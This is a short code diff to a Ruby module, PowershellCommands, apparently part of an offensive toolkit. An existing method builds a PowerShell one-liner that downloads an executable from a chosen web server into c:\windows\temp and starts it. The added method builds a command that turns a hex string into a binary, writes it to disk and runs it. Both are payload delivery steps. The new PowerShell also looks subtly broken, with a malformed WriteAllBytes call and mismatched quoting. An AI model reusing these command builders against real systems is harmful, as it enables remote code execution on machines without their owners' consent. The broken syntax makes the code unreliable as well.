@@ -20,4 +20,8 @@ module PowershellCommands
     powershell_command = %((new-object System.Net.WebClient).DownloadFile('#{web_server}/#{executable}', c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable}")
     return powershell_command
   end
+  def powershell_hex_to_bin(hex,write_path)
+    powershell_command = %($hex_string=#{hex};$byte_array=$hex_string -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}};[System.IO.WriteAllBytes(#{write_path},$byte_array);Start-Process #{write_path})
+    return powershell_command
+  end
 end
